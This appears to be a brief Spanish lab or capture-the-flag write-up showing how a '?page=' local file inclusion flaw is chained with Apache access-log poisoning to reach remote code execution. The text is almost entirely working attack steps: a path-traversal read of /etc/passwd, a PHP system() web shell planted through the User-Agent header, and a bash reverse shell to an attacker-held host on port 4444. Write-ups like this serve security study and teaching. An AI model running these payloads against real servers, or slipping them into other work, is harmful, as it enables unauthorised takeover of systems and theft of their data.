# LFI + Log Poisoning

El parámetro `?page=` permitía incluir archivos del servidor:

    ?page=../../../../etc/passwd

Sin sanitización. El servidor registraba user-agents en `/var/log/apache2/access.log`. Modifiqué mi User-Agent en Burp:

    <?php system($_GET['cmd']); ?>

Luego accedí a:

    ?page=../../../../var/log/apache2/access.log&cmd=id

Ejecutó comando. Conseguí una RCE mediante:

    ?page=../../../../var/log/apache2/access.log&cmd=/bin/bash -c 'bash -i >& /dev/tcp/myip/4444 0>&1'

El ejercicio demuestra explotación combinada LFI + log poisoning + RCE + reverse shell.
